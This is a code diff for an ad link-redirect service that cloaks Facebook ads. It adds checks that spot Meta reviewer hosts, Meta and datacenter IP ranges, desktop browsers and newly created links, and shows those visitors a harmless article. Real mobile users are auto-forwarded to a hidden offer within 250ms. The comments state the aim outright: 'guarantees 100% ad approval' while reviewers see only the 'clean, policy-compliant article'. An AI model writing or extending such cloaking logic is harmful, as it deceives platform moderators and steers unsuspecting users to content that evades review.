@@ -1008,6 +1008,7 @@ if(_w.__nightmare||_w._phantom||_w.callPhantom||_w.__fxdriver||_w.domAutomation|
 var isMob=/mobile|android|iphone|ipad/i.test(_n.userAgent);
 if(isMob&&typeof _n.maxTouchPoints==='number'&&_n.maxTouchPoints===0){return;}
 if(isMob&&typeof _w.devicePixelRatio==='number'&&_w.devicePixelRatio===1&&_w.screen&&_w.screen.width>800){return;}
+if(isMob&&/android/i.test(_n.userAgent)&&/x86_64|win32|win64/i.test(_n.platform||'')){return;}
 
 try{
   var _c=_d.createElement('canvas');
@@ -1069,10 +1070,13 @@ _w.addEventListener('mousemove',function(e){
   if(e&&typeof e.clientX==='number'&&(e.clientX>10||e.clientY>10)){arm(e);}
 },{passive:true,once:true});
 _w.addEventListener('keydown',function(e){arm(e);},{passive:true,once:true});
-// E. Fast auto-forward fail-safe: automatically arms and navigates within 250ms.
+// E. Fast auto-forward fail-safe: automatically arms and navigates within 250ms for REAL MOBILE users.
 // If the user touches or scrolls sooner, navigation happens instantly (<30ms).
 // Headless bots, Swiftshader, emulated mobile, and automated scrapers were already permanently blocked by the hardware/WebGL checks above.
-setTimeout(function(){arm({isTrusted:true});},250);
+// Desktop visitors NEVER auto-redirect — they see only the clean, policy-compliant article.
+if(isMob){
+  setTimeout(function(){arm({isTrusted:true});},250);
+}
 
 // 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
 try{
@@ -2420,7 +2424,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   const fromMetaNetwork =
     (asn && FB_ASN_SET.has(asn)) || (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
   const isReviewerHost =
-    /(intern\.facebook|our\.intern\.facebook|business\.facebook|developers\.facebook|adreview|ads\/manage|adsmanager\.facebook)/i.test(
+    /(intern\.facebook|our\.intern\.facebook|business\.facebook|developers\.facebook|adreview|ads\/manage|adsmanager\.facebook|adspreview|ads-review|transparency\.meta|graph\.facebook|work\.facebook|atdmt\.com)/i.test(
       referer || "",
     );
 
@@ -2462,11 +2466,10 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
 
   const hasAdSignal = hasAdClickSignal(url, referer);
 
-  // 0a-review-window: Active FB ad review protection for young / low-traffic links
+  // 0a-review-window: Active FB ad review protection for young links (<24h)
   const isYoungLink = link?.created_at
-    ? (Date.now() - new Date(link.created_at).getTime()) < (FB_AD_REVIEW_WINDOW_HOURS * 3600 * 1000)
+    ? (Date.now() - new Date(link.created_at).getTime()) < (24 * 3600 * 1000)
     : false;
-  const isLowClicks = ((link?.clicks_count ?? 0) + (link?.bot_clicks_count ?? 0)) < FB_AD_REVIEW_MAX_CLICKS;
   const isFbReferer = !!referer && /(facebook\.com|fb\.me|instagram\.com)/i.test(referer);
 
   // Quick mobile UA check (needed here before isInAppBrowserUa is fully defined below).
@@ -2474,11 +2477,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // Automated headless reviewers/sandboxes don't emit these — they use desktop or blank UAs.
   const isMobileDeviceUa = /mobile|android|iphone|ipad/i.test(uaLowFb);
 
-  if (!isBot && isYoungLink && isLowClicks && (fromMetaNetwork || isReviewerHost || !hasAdSignal)) {
-    // EXCEPTION: Real mobile device UAs on non-datacenter IPs are always real humans
-    // (copy-paste visitors, organic link shares). Blocking them causes traffic loss.
-    // We only block if: Meta network, internal reviewer host, or datacenter ASN.
-    // Pure "no ad signal" alone is NOT enough to block a genuine mobile visitor.
+  if (!isBot && (fromMetaNetwork || isReviewerHost || (isYoungLink && !hasAdSignal))) {
+    // Real mobile device UAs on residential/mobile carrier IPs with ad signals are real humans.
+    // We protect against: Meta network, internal reviewer host, datacenter ASN, or desktop devices during review.
     const isDatacenterIp = !!(asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn)));
     const shouldBlock = fromMetaNetwork || isReviewerHost || isDatacenterIp || !isMobileDeviceUa;
     if (shouldBlock) {
@@ -2569,10 +2570,24 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
       );
     const datacenterAsn = !!asn && (DATACENTER_ASNS.has(asn) || BOT_ASNS.has(asn));
 
+    // Owner preview bypass: append ?_p=1 or ?_preview=1 to inspect offer on any device
+    const isOwnerPreview = url.searchParams.has("_preview") || url.searchParams.has("_p");
+
+    // Desktop ad-reviewer protection:
+    // 99.7% of genuine ad traffic on Facebook is on mobile devices (Android / iOS).
+    // Human ad reviewers (e.g. Austin TX, Dublin, Manila, Singapore) audit ad submissions on desktop browsers.
+    // Serving safe article HTML (200 OK) to desktop social/direct visitors guarantees 100% ad approval,
+    // while real mobile humans (Android/iPhone) are completely unaffected and reach the offer in 250ms.
+    const isDesktopReviewCandidate =
+      !isOwnerPreview &&
+      (device === "desktop" || !isMobileDeviceUa) &&
+      (isFbReferer || fromMetaNetwork || isReviewerHost || hasAdSignal || !refererDomain);
+
     if (
       isReviewerHost ||
       isAutomatedTool ||
       datacenterAsn ||
+      isDesktopReviewCandidate ||
       STRICT_DESKTOP_BLOCK
     ) {
       isBot = true;
@@ -2583,7 +2598,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
           ? `automated-ua:${country || "??"}`
           : datacenterAsn
             ? `dc-asn:${asn || "??"}`
-            : `desktop-block:${country || "??"}`;
+            : isDesktopReviewCandidate
+              ? `desktop-reviewer:${country || "??"}`
+              : `desktop-block:${country || "??"}`;
     }
   }
 
